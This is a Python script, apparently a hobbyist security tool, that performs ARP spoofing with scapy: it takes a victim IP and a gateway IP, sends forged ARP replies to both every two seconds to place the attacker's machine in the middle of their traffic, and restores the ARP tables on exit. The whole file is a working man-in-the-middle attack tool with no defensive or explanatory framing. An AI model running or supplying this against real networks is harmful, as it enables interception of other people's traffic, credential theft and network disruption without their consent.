import optparse
import scapy.all as scapy
import time

def get_argument():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest='target_ip', help="Specify Victim IP Address")
    parser.add_option('-r', '--router', dest='router_ip', help="Specify Gateway IP Address")
    options, arguments = parser.parse_args()

    if not options.target_ip:
        parser.error('[-] Please enter Target IP Address, use -h for help.')
    if not options.router_ip:
        parser.error('[-] Please enter Router IP Address, use -h for help.')

    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = arp_broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if not answered:
        print(f"[-] Error: Could not resolve MAC address for {ip}. Check connectivity and IP.")
        exit(1)
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    arp_response = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip , hwsrc=src_mac)
    scapy.send(arp_response, count=4, verbose=False)


options = get_argument()
spoof_ip = options.router_ip
target_ip = options.target_ip

try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip,target_ip)
        print("[+] Sent spoofed ARP packet to target.")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)
    print("[+] Restored ARP tables.")
    print("\n[!] Detected CTRL+C. Exiting...")